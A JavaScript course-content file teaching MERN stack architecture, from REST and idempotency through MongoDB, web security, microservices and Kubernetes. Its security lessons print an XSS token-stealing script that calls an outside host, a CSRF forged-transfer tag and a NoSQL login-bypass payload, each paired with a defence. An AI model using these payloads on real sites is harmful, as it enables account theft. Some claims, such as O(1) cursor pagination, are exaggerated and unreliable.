export const mern = {
    id: "mern",
    title: "MERN Mastery: The 25-Phase Epic",
    description: "Architect distributed enterprise systems. Scale from basic REST APIs to Event-Driven Microservices, API Gateways, and Kubernetes deployments.",
    image: "/courses/mern.png",
    tags: ["MongoDB", "Express", "React", "Node.js", "Microservices", "Epic"],
    duration: "125 Chapters (Architect to CTO)",
    level: "Advanced",
    modules: [
        // API DESIGN (PHASES 1-5)
        {
            id: "phase1",
            title: "Phase 1: True REST Architecture",
            pages: [
                {
                    id: "nouns-not-verbs",
                    title: "Resource Representation",
                    content: `# The RPC Antipattern\n\nBeginners design APIs like \`/getUsers\` or \`/createNewItem\`. This is Remote Procedure Calling (RPC). REST (Representational State Transfer) dictates that URLs must be strictly Nouns (Resources) like \`/users\`. The HTTP Verbs (\`GET\`, \`POST\`, \`DELETE\`) dictate the mathematical action upon that resource.\n\n### The Standard Matrix\n*   \`GET /users\` (Fetch array of all users)\n*   \`POST /users\` (Create a new user)\n*   \`GET /users/123\` (Fetch specific user)\n*   \`PUT /users/123\` (Completely overwrite user 123)\n*   \`DELETE /users/123\` (Destroy user 123)`
                },
                {
                    id: "nested-resources",
                    title: "Relational Endpoints",
                    content: `# Modeling Relationships\n\nHow do you get all posts written by a specific user?\n\n**BAD:** \`/getUsersPosts?userId=123\`\n**GOOD:** \`/users/123/posts\`\n\nThis perfectly defines the hierarchical relationship. The Posts belong to User 123. If you want to delete a specific post inside that user: \`/users/123/posts/456\`.`
                }
            ]
        },
        {
            id: "phase2",
            title: "Phase 2: Idempotency",
            pages: [
                {
                    id: "safe-retry",
                    title: "The Double-Tap Problem",
                    content: `# What if the network drops?\n\nIf a user clicks "Pay Now" and their WiFi drops instantly, their browser might retry the \`POST /charge\` request. If your API is not Idempotent, you just charged their credit card twice.\n\n### Idempotent vs Non-Idempotent\nA request is **Idempotent** if making it 1,000 times has the exact same end-result mathematically as making it 1 time.\n\n*   **GET:** Idempotent. Reading a database doesn't change it.\n*   **PUT:** Idempotent. Overwriting a name to "Sagar" 1,000 times means the name is still "Sagar".\n*   **POST:** Non-Idempotent. Firing a "Create Ticket" POST 10 times creates 10 physical database rows.`
                },
                {
                    id: "idempotency-keys",
                    title: "Stripe's Engineering Solution",
                    content: `# Fixing POST Requests\n\nHow does Stripe handle accidental double payments? **Idempotency Keys**.\n\nWhen the React App clicks "Pay", it generates a UUID: \`req_12345\`, and sends it in the HTTP Headers.\n\n\`\`\`javascript\n// Node.js Checkout Route\napp.post('/charge', async (req, res) => {\n  const key = req.headers['x-idempotency-key'];\n  \n  // 1. Check Redis fast cache\n  const previousCharge = await redis.get(key);\n  if (previousCharge) return res.send(previousCharge); // Short-circuit!\n  \n  // 2. Perform the physical DB/Stripe math\n  const charge = await Stripe.charge(req.body.amount);\n  \n  // 3. Save the result permanently to Redis before answering\n  await redis.set(key, charge, 'EX', 86400);\n  res.send(charge);\n});\n\`\`\`\nNow, if the user double-clicks, the second request reads the cached key and silently absorbs the duplicate payload.`
                }
            ]
        },
        {
            id: "phase3",
            title: "Phase 3: Rate Limiting & DDoS",
            pages: [
                {
                    id: "leaky-bucket",
                    title: "Protecting the Core",
                    content: `# The Server Crash\n\nIf a hacker writes a Python script hitting your \`/login\` route 50,000 times a second, your Node server will run out of memory trying to query MongoDB, and crash instantly. \n\nYou MUST implement physical firewalls at the API layer.`
                },
                {
                    id: "express-rate-limit",
                    title: "Redis Implementation",
                    content: `# The Token Bucket Algorithm\n\n\`\`\`javascript\nimport rateLimit from 'express-rate-limit';\nimport RedisStore from 'rate-limit-redis';\nimport { createClient } from 'redis';\n\nconst redisClient = createClient();\nawait redisClient.connect();\n\n// We attach this explicitly to the /api/login route\nexport const loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 physical minutes\n  max: 5, // Limit each IP to 5 incorrect password attempts\n  standardHeaders: true, // Return rate limit info in the 'RateLimit-*' headers\n  store: new RedisStore({\n    sendCommand: (...args) => redisClient.sendCommand(args),\n  }),\n  message: \"Too many login attempts from this IP, please try again after 15 minutes\"\n});\n\`\`\`\nBy backing the limiter with **Redis**, it works globally across 50 different microservices simultaneously.`
                }
            ]
        },
        {
            id: "phase4",
            title: "Phase 4: Data Pagination",
            pages: [
                {
                    id: "offset-pagination",
                    title: "Why .skip() is lethal",
                    content: `# The O(N) Penalty\n\n\`\`\`javascript\n// DO NOT DO THIS FOR LARGE TABLES\ndb.users.find().skip(500000).limit(10);\n\`\`\`\nTo skip 500,000 documents, MongoDB has to physically locate, read, and step over half a million rows on the Hard Drive just to find the next 10. This query will take 15 seconds to execute, functionally destroying your application.`
                },
                {
                    id: "cursor-pagination",
                    title: "The B-Tree Advantage",
                    content: `# Time Complexity O(1)\n\nCursor based pagination remembers the exact physical \`_id\` of the very last item the user saw on Page 1.\n\n\`\`\`javascript\n// Page 2 Request: ?last_id=60d5ec42f\nconst lastId = req.query.last_id;\n\n// Use the heavily mathematically optimized _id Index tree!\ndb.users.find({ _id: { $gt: lastId } }).limit(10);\n\`\`\`\nMongoDB's B-Tree jumps instantly to that specific ID in 0.001 milliseconds, and simply grabs the next 10 rows. It scales infinitely to billions of users without slowing down.`
                }
            ]
        },
        {
            id: "phase5",
            title: "Phase 5: HATEOAS",
            pages: [
                {
                    id: "api-discoverability",
                    title: "The Highest Level of REST",
                    content: `# The Richardson Maturity Model\n\nHATEOAS (Hypermedia as the Engine of Application State) is the peak of REST API maturity. \n\nInstead of hardcoding frontend button logic (\`if (user.role === 'admin') showDeleteButton()\`), the API physically tells the frontend exactly what operations are currently permitted.`
                },
                {
                    id: "hypermedia-payload",
                    title: "Self-Documenting JSON",
                    content: `# Returning the _links Array\nWhen a Client requests a specific bank account, the API calculates permissions in real-time:\n\n\`\`\`json\n{\n  \"accountNumber\": \"12345\",\n  \"balance\": 100.00,\n  \"_links\": {\n    \"self\": { \"href\": \"/accounts/12345\" },\n    \"deposit\": { \"href\": \"/accounts/12345/deposit\" },\n    // The API detected the balance > 0, so it included the withdraw link.\n    // If balance was 0, it would omit this line, meaning the Frontend \n    // React app knows to disable the Withdraw button automatically.\n    \"withdraw\": { \"href\": \"/accounts/12345/withdraw\" }\n  }\n}\n\`\`\``
                }
            ]
        },

        // ADVANCED DATABASES (PHASES 6-10)
        {
            id: "phase6",
            title: "Phase 6: The NoSQL Illusion",
            pages: [
                {
                    id: "schema-validation",
                    title: "Why Mongoose Exists",
                    content: `# The Danger of Schemaless\n\nMongoDB allows you to insert a \`String\` on Monday and an \`Array\` on Tuesday into the exact same \`age\` field. This dynamic flexibility is a nightmare for data integrity. Your React Native app will instantly crash when it tries to run \`.toFixed()\` on an Array.\n\n**Mongoose** is an ODM (Object Data Modeling) library that enforces Strict Schemas at the Node.js application layer, validating regex and data types before physically hitting the Mongo disk.`
                }
            ]
        },
        {
            id: "phase7",
            title: "Phase 7: B-Tree Indexing",
            pages: [
                {
                    id: "coll-scan",
                    title: "Defeating the COLLSCAN",
                    content: `# Reading the whole book\n\nIf you query \`db.users.find({ email: 'sagar@x.com' })\` and \`email\` is not indexed by the developer, Mongo performs a 'Collection Scan'. It physically loads every single document from the SSD into RAM to check it line by line.\n\n\`\`\`javascript\n// Mongoose Schema Definition\nconst userSchema = new mongoose.Schema({\n  email: { type: String, unique: true, index: true }, // <--- CRITICAL\n});\n\`\`\`\n\nAn Index builds a secondary B-Tree structure in RAM containing only the emails. Locating the email in a B-Tree takes \`O(log N)\` time, reducing a 5-second lookup query against 10 Million users down to 2 milliseconds.`
                }
            ]
        },
        {
            id: "phase8",
            title: "Phase 8: Aggregation Pipelines",
            pages: [
                {
                    id: "db-math",
                    title: "Database Compute",
                    content: `# Never Pull and Filter\n\nIf you need the average age of 1 Million users, pulling 1 Million rows across the network into Node's RAM to run Javascript's \`.reduce()\` will crash the server.\n\nYou MUST use MongoDB's Aggregation Framework (written in hyper-optimized C++ natively on the DB Server).`
                },
                {
                    id: "aggregation-stages",
                    title: "The Pipeline Array",
                    content: `# $match, $group, $project\n\n\`\`\`javascript\nconst stats = await User.aggregate([\n  // Stage 1: Filter out inactive users (like a WHERE clause)\n  { $match: { status: 'active' } },\n  \n  // Stage 2: Group them by country and calculate the exact mathematical average\n  { $group: { \n      _id: '$country', \n      averageAge: { $avg: '$age' },\n      totalUsers: { $sum: 1 }\n  }},\n  \n  // Stage 3: Sort by highest population\n  { $sort: { totalUsers: -1 } }\n]);\n\`\`\`\nThe Network payload returned to Node.js is exactly 1 tiny JSON array with the final numbers. Zero bandwidth wasted.`
                }
            ]
        },
        {
            id: "phase9",
            title: "Phase 9: Race Conditions",
            pages: [
                {
                    id: "double-booking",
                    title: "The Ticket Error",
                    content: `# Two requests, one ticket\n\n\`\`\`javascript\n// TERRIBLE CODE - DO NOT DO THIS\nconst event = await Event.findById(id);\nif (event.tickets > 0) {\n   event.tickets = event.tickets - 1;\n   await event.save();\n}\n\`\`\`\nIf two users click "Buy" at the exact same millisecond, they both pull \`tickets = 1\` into Node RAM simultaneously. They both subtract 1. They both save \`0\`. You just sold an imaginary, non-existent ticket.`
                },
                {
                    id: "atomic-increments",
                    title: "Pushing the Math to Disk",
                    content: `# The $inc operator\n\nTo prevent Race Conditions, you must use Atomic Database Operators. You never read the value into Node.js.\n\n\`\`\`javascript\n// PERFECT CODE\nconst updatedEvent = await Event.findOneAndUpdate(\n  { _id: id, tickets: { $gt: 0 } }, // Explicit lock query\n  { $inc: { tickets: -1 } },        // Decrement ATOMICALLY on the disk\n  { new: true }\n);\n\nif (!updatedEvent) throw new Error("Sold out!");\n\`\`\`\nMongoDB guarantees mathematically that \`$inc\` operations are queued physically on the disk, making it impossible for two users to mutate the same integer at the exact same millisecond.`
                }
            ]
        },
        {
            id: "phase10",
            title: "Phase 10: Replica Sets & Sharding",
            pages: [
                {
                    id: "horizontal-scale",
                    title: "Scaling the DB",
                    content: `# Replicas vs Shards\n\n**Replica Set (High Availability):** Copies your entire DB to 3 different AWS servers. Node.js writes to Primary. Primary asynchronously syncs to Secondaries. If Primary catches on fire, a Secondary instantly elects itself the new Primary. Zero downtime.\n\n**Sharding (Horizontal Scaling):** When your database hits 10 Terabytes, a single hard drive cannot fit it. Sharding physically chops your database into 5 different 2-Terabyte databases based on a Shard Key (like splitting A-M users to Server 1, and N-Z users to Server 2).`
                }
            ]
        },

        // ENTERPRISE SECURITY (PHASES 11-15)
        {
            id: "phase11",
            title: "Phase 11: Cross-Site Scripting (XSS)",
            pages: [
                {
                    id: "dangerously-set",
                    title: "Injecting Malicious Scripts",
                    content: `# The LocalStorage Trap\n\nIf you allow users to post raw HTML comments, a hacker can post \`<script>fetch('http://hacker.com?token=' + localStorage.getItem('token'))</script>\`.\n\nIf another user views that comment, their browser blindly executes the script, instantly stealing their authentication token.\n\n**Rule 1:** Never use \`dangerouslySetInnerHTML\` in React without a sanitization library like DOMPurify.\n**Rule 2:** Never physically store JWTs inside \`localStorage\`.`
                }
            ]
        },
        {
            id: "phase12",
            title: "Phase 12: HttpOnly Cookies",
            pages: [
                {
                    id: "xss-defense",
                    title: "The Invisible Token",
                    content: `# Defeating XSS\n\nThe only secure place for an Auth Token is an \`HttpOnly\`, \`Secure\` flag Cookie.\n\n\`\`\`javascript\n// Node.js Login Response\nres.cookie('jwt', token, {\n  httpOnly: true, // Mathematically impossible for Javascript to read it\n  secure: true,   // Only transmitted over HTTPS encryption\n  sameSite: 'strict', \n  maxAge: 3600000\n});\n\`\`\`\nThe browser automatically attaches this cookie to every outgoing network request, but if an XSS hacker runs \`console.log(document.cookie)\`, the JWT is physically invisible.`
                }
            ]
        },
        {
            id: "phase13",
            title: "Phase 13: CSRF Attacks",
            pages: [
                {
                    id: "forgery",
                    title: "Cross-Site Request Forgery",
                    content: `# The Dark Side of Cookies\n\nBecause the browser auto-attaches cookies, a hacker can build an evil website with a hidden image tag \`<img src=\"http://yourbank.com/transfer/1000/hacker\">\`. \n\nIf the user is logged into their bank in Tab 1, and opens the evil website in Tab 2, their browser attempts to load the "image", automatically attaching their secure bank cookie. The bank executes the forged transfer.\n\n**Defense:** The \`SameSite: Strict\` cookie flag physically prevents the browser from attaching cookies to cross-domain background requests.`
                }
            ]
        },
        {
            id: "phase14",
            title: "Phase 14: SQL/NoSQL Injections",
            pages: [
                {
                    id: "nosql-inject",
                    title: "Bypassing the Login",
                    content: `# The $gt exploit\n\nIf your Express login code blindly accepts JSON objects:\n\`\`\`javascript\n// DANGEROUS\ndb.users.find({ username: req.body.username, password: req.body.password })\n\`\`\`\n\nA hacker can send a JSON payload modifying the password to be an operator: \`{ "username": "admin", "password": { "$gt": "" } }\`.\nBecause EVERY string in existence is "greater than" an empty string, MongoDB happily validates the password match without knowing the actual password.\n\n**Defense:** ALWAYS type-cast req.body variables to strict Strings (\`String(req.body.password)\`), completely stripping out NoSQL operators.`
                }
            ]
        },
        {
            id: "phase15",
            title: "Phase 15: Token Rotation",
            pages: [
                {
                    id: "refresh-tokens",
                    title: "Access vs Refresh",
                    content: `# Handling Compromised Tokens\n\nJSON Web Tokens (JWTs) are mathematically cryptographically signed, meaning they cannot be forged. BUT, they cannot be revoked. If a hacker steals a JWT, they own the account until the token expires.\n\n### The Dual Token Matrix\n1.  **Access Token:** Extremely short-lived (15 minutes). Used for every single API call.\n2.  **Refresh Token:** Long-lived (7 days). Stored securely. Only used at the \`/refresh\` endpoint to generate a brand new Access Token.\n\nIf a hacker steals an Access Token via WiFi sniffing, they lose access in 15 minutes. If a user is banned, the admin deletes their Refresh token from the DB. They physically cannot generate a new Access token.`
                }
            ]
        },

        // DISTRIBUTED ARCHITECTURE (PHASES 16-20)
        {
            id: "phase16",
            title: "Phase 16: The Monolith",
            pages: [
                {
                    id: "monolith-scaling",
                    title: "When to split?",
                    content: `# Don't start with Microservices\n\nA beautifully decoupled Modular Monolith (one giant server, meticulously separated into clean folders/modules) is infinitely better than a chaotic "Distributed Monolith" (where 50 microservices depend on each other linearly and crash together).\n\nYou should ONLY split a Monolith into Microservices when the Engineering Team scales to 50+ developers, and Team A (Billing) needs to deploy code at 2AM without breaking Team B (Chat) code boundaries.`
                }
            ]
        },
        {
            id: "phase17",
            title: "Phase 17: Microservices",
            pages: [
                {
                    id: "service-boundaries",
                    title: "Domain Driven Design",
                    content: `# The Bounded Context\n\nMicroservices MUST absolutely own their data. An "Order Service" cannot connect directly to the "User Service" MongoDB database.\n\nIf the User Service changes its Schema, the Order Service would instantly crash. Services must communicate strictly through negotiated JSON API contracts or RabbitMQ event streams, allowing them to use entirely different database technologies natively (Order uses Mongo, User uses Postgres, Analytics uses C++).`
                }
            ]
        },
        {
            id: "phase18",
            title: "Phase 18: API Gateways",
            pages: [
                {
                    id: "reverse-proxy",
                    title: "Nginx & Load Balancing",
                    content: `# The Front Door\n\nInstead of a React app memorizing 50 different microservice IP addresses, it hits exactly 1 URL (\`api.yourcompany.com\`).\n\nThe API Gateway (often Nginx or AWS API Gateway) reads the URL path and invisibly Reverse Proxies to internal Docker networks.\n*   \`/auth/*\` routes to Server Cluster A\n*   \`/payments/*\` routes to Server Cluster B\nIt also handles global SSL Terminations and Rate Limiting centrally before traffic even touches Node.js.`
                }
            ]
        },
        {
            id: "phase19",
            title: "Phase 19: Event-Driven Architecture",
            pages: [
                {
                    id: "pub-sub",
                    title: "Kafka & RabbitMQ",
                    content: `# Asynchronous Coupling\n\nIf the Billing Service calls the Email Service synchronously via \`axios.post()\` to send a receipt, and the Email Service is down, the Billing Service hangs and the user checkout utterly fails.\n\nIn **Event-Driven systems**, Billing simply drops a \`payment.success\` JSON event payload into a Message Broker (RabbitMQ / Kafka) and instantly forgets about it, telling the user "Checkout Complete!"\n\nThe Email service consumes that event off the RabbitMQ queue whenever it comes back online, ensuring mathematically zero data loss.`
                }
            ]
        },
        {
            id: "phase20",
            title: "Phase 20: CQRS Pattern",
            pages: [
                {
                    id: "read-write-split",
                    title: "Command Query Responsibility Segregation",
                    content: `# Optimizing for Traffic\n\nMost apps have 100x more Reads than Writes. CQRS splits the app into two completely isolated systems.\n\n1.  **Command API (Writes):** Heavily validated \`POST\` endpoints writing strictly to a relational PostgreSQL database.\n2.  **Query API (Reads):** A blazing fast \`GET\` endpoint reading from a completely denormalized MongoDB/Redis view layer.\n\nWhen data is written to Postgres, a background Event streams the new data over to Mongo, updating the "Read View" in real-time, allowing you to scale the two servers entirely independently.`
                }
            ]
        },

        // DEVOPS & INFRASTRUCTURE (PHASES 21-25)
        {
            id: "phase21",
            title: "Phase 21: Containerization",
            pages: [
                {
                    id: "docker-intro",
                    title: "Docker Architectures",
                    content: `# 'It works on my machine'\n\nDocker solves environment mismatches. Instead of installing Node 18, Mongo 5, and Redis manually on a Linux Terminal, you write a \`Dockerfile\`.\n\n\`\`\`dockerfile\nFROM node:18-alpine\nWORKDIR /app\nCOPY package.json .\nRUN npm install\nCOPY . .\nCMD ["node", "server.js"]\n\`\`\`\n\nThe entire app, the Ubuntu OS logic, and its library dependencies are mathematically packaged into an immutable 'Image' that spawns perfectly isolated instances (Containers) that run exactly the same on a Macbook or AWS.`
                }
            ]
        },
        {
            id: "phase22",
            title: "Phase 22: Docker Compose",
            pages: [
                {
                    id: "multi-container",
                    title: "Orchestrating the Local Stack",
                    content: `# Spinning up the architecture\n\nA \`docker-compose.yml\` file allows you to define 3 different microservices, a Redis cache, and a Mongo database.\n\nSimply running \`docker compose up -d\` pulls the exact matching versions of every database, provisions isolated virtual networks so they can ping each other securely by name, and boots the entire enterprise ecosystem in 5 seconds on your local laptop.`
                }
            ]
        },
        {
            id: "phase23",
            title: "Phase 23: CI/CD Pipelines",
            pages: [
                {
                    id: "github-actions",
                    title: "Continuous Integration",
                    content: `# The Automated Robot\n\nWhen a developer opens a Pull Request, a GitHub Action spins up a headless Linux server, installs dependencies, runs the \`Jest\` test suite, runs \`ESLint\`, builds the physical Docker image, and strictly blocks the PR merge if a single test fails.\n\nHumans should never manually test code or manually SSH into servers to \`git pull\`. Every merge should spawn an automated deployment pipeline (Continuous Delivery).`
                }
            ]
        },
        {
            id: "phase24",
            title: "Phase 24: Blue-Green Deployments",
            pages: [
                {
                    id: "zero-downtime",
                    title: "Never taking the site offline",
                    content: `# The Router Flip\n\nHow does Netflix update their server without breaking active videos?\n\nIn Blue-Green, you have two full identical production environments. Blue is serving live traffic. You deploy your new V2 code to the hidden Green environment. You run integration tests on Green safely.\n\nIf all pass, you instantly swap the Nginx API Gateway Router to point to Green. Zero millisecond downtime deployment.`
                }
            ]
        },
        {
            id: "phase25",
            title: "Phase 25: Kubernetes (K8s)",
            pages: [
                {
                    id: "k8s-orchestration",
                    title: "The Self-Healing Cluster",
                    content: `# The Final Boss\n\nDocker manages a Container. Kubernetes (K8s) manages the entire Fleet.\n\nYou give K8s a YAML blueprint: "I want exactly 5 replicas of the User Service running at all times."\n\nIf an AWS Server rack physically catches fire and 2 servers die, K8s detects the Ping failure, and instantly commands a healthy server in an entirely different timezone to spin up 2 new Docker containers to maintain the perfect state. It is the ultimate self-healing mathematical system.`
                }
            ]
        }
    ]
};
